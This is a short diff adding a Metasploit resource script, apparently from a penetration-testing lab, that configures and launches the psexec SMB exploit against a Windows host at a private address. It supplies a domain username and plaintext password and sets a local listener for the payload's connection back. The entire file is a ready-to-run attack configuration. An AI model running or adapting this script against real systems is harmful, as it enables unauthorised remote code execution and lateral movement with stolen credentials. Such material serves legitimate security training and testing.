@@ -1,0 +1,10 @@
+#!/bin/bash
+#resource4.rc
+
+use exploit/windows/smb/psexec
+set RHOSTS 172.22.117.20
+set SMBUser tstark
+set SMBPass Password!
+set SMBDomain megacorpone
+set LHOST 172.22.117.100
+run
